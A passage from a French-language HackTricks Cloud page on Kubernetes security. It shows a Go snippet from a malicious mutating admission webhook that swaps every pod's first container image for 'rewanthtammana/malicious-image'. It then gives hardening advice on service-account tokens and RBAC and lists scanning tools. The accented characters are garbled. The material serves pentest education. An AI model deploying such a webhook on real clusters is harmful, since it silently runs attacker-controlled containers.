![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Comme vous pouvez le voir dans l'image ci-dessus, nous avons essay√© d'ex√©cuter l'image `nginx` mais l'image ex√©cut√©e finalement est `rewanthtammana/malicious-image`. Que s'est-il pass√© !!?

#### Aspects techniques <a href="#heading-technicalities" id="heading-technicalities"></a>

Le script `./deploy.sh` √©tablit un contr√¥leur d'admission de webhook de mutation, qui modifie les requ√™tes vers l'API Kubernetes telles que sp√©cifi√©es dans ses lignes de configuration, influen√ßant ainsi les r√©sultats observ√©s:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Le snippet ci-dessus remplace la premi√®re image de conteneur dans chaque pod par `rewanthtammana/malicious-image`.

## Contournement de OPA Gatekeeper

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Bonnes pratiques

### **D√©sactiver le montage automatique des jetons de compte de service**

* **Pods et comptes de service**: Par d√©faut, les pods montent un jeton de compte de service. Pour renforcer la s√©curit√©, Kubernetes permet de d√©sactiver cette fonctionnalit√© de montage automatique.
* **Comment appliquer**: D√©finir `automountServiceAccountToken: false` dans la configuration des comptes de service ou des pods √† partir de la version 1.6 de Kubernetes.

### **Affectation d'utilisateurs restrictive dans les RoleBindings/ClusterRoleBindings**

* **Inclusion s√©lective**: Veiller √† ce que seuls les utilisateurs n√©cessaires soient inclus dans les RoleBindings ou ClusterRoleBindings. Auditer r√©guli√®rement et supprimer les utilisateurs non pertinents pour maintenir une s√©curit√© stricte.

### **R√¥les sp√©cifiques √† l'espace de noms plut√¥t que des r√¥les globaux**

* **R√¥les vs ClusterRoles**: Privil√©gier l'utilisation de R√¥les et RoleBindings pour les autorisations sp√©cifiques √† l'espace de noms plut√¥t que des ClusterRoles et ClusterRoleBindings, qui s'appliquent √† l'ensemble du cluster. Cette approche offre un contr√¥le plus fin et limite la port√©e des autorisations.

### **Utiliser des outils automatis√©s**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **R√©f√©rences**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
